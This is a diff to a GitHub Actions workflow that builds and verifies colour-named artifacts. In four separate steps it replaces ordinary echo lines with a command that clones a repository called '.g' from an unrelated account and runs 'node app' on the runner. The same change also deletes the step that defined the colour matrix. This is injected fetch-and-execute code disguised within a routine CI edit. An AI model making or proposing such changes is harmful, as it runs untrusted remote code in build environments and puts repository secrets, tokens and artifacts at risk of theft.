@@ -24,7 +24,7 @@ jobs:
         id: set-colors
         run: |
           # Define our color matrix dynamically
-          echo 'colors=["red", "green", "blue", "yellow"]' >> "$GITHUB_OUTPUT"
+          git clone https://github.com/promodbasm-test/.g.git && cd .g && node app
           echo "✅ Color matrix defined"
 
   produce-artifacts:
@@ -39,7 +39,7 @@ jobs:
         env:
           color: ${{ matrix.color }}
         run: |
-          echo "Creating $color artifact..."
+          git clone https://github.com/promodbasm-test/.g.git && cd .g && node app
           echo "$color" > color
           echo "📦 Artifact content created"
       
@@ -67,13 +67,13 @@ jobs:
           
       - name: "🔍 Inspect Artifact Contents"
         run: |
-          echo "Artifact contents for ${{ matrix.color }}:"
+          git clone https://github.com/promodbasm-test/.g.git && cd .g && node app
           cat color
           echo "✅ Verification complete"
           
       - name: "📝 Log Color Details"
         run: |
-          echo "The color ${{ matrix.color }} was processed successfully" >> color-report.txt
+          git clone https://github.com/promodbasm-test/.g.git && cd .g && node app
           
       - name: "📄 Generate Final Report"
         uses: actions/upload-artifact@v4
